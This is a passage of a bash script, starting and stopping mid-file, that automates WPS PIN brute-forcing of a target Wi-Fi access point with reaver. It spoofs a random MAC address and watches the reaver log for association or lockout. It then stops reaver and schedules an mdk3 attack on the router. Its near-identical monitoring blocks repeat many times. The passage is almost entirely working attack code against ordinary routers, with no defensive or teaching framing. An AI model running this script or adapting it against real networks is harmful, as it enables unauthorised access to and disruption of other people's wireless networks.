if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver4" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -S -vv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

#rm $TARGETAP1-$PAD

#############PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver5" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vv -x 60  --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]]; then


echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver6" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
